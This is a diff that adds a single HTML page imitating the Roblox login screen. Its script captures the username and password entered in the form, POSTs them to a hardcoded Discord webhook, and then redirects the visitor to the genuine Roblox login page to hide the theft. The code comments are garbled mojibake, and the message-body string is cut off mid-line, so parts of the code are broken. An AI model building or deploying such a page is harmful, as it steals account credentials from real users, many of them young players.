@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Login</title>
+    <style>
+        body { font-family: 'Builder Sans', Arial, sans-serif; background-color: #232527; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background-color: #2b2d30; padding: 40px; border-radius: 8px; width: 350px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+        .logo { width: 120px; margin-bottom: 20px; }
+        h2 { margin-bottom: 20px; font-weight: 500; }
+        input { width: 100%; padding: 12px; margin: 8px 0; background: #1b1c1e; border: 1px solid #444; color: white; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        input:focus { outline: none; border-color: #00a2ff; }
+        button { width: 100%; padding: 12px; background-color: #00a2ff; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #0081cc; }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <!-- X4X9X'X1 X1X(YYX3 -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Roblox_logo.svg" alt="Roblox" class="logo">
+        
+        <h2>Login to Roblox</h2>
+        
+        <form id="loginForm">
+            <input type="text" id="username" name="username" placeholder="Username/Email/Phone" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+
+    <script>
+        // X6X9 X1X'X(X7 X'YY
+X( Y X'YX.X'X5 X(Y Y'
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1571930881566843022/5-t-m3kvQusR-V87-_xjcfysYQy01j4RVu8omIePkEdIC2o5HCABKLEw1PhxlYcqp3r_";
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // YY
+X9 X'YX%X1X3X'Y X'YX7X(Y X9Y
+
+
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // X%X1X3X'Y X'YX(Y
+X'Y X'X* X%YY X/Y
+X3YX1X/
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `p                })
+            }).then(() => {
+                // X*X,Y
+Y'YYX3X*X.X/Y X%YY X1X(YYX3 X'YX-YY YY
+X)
+                window.location.href = "https://www.roblox.com/login";
+            });
+        });
+    </script>
+
+</body>
+</html>
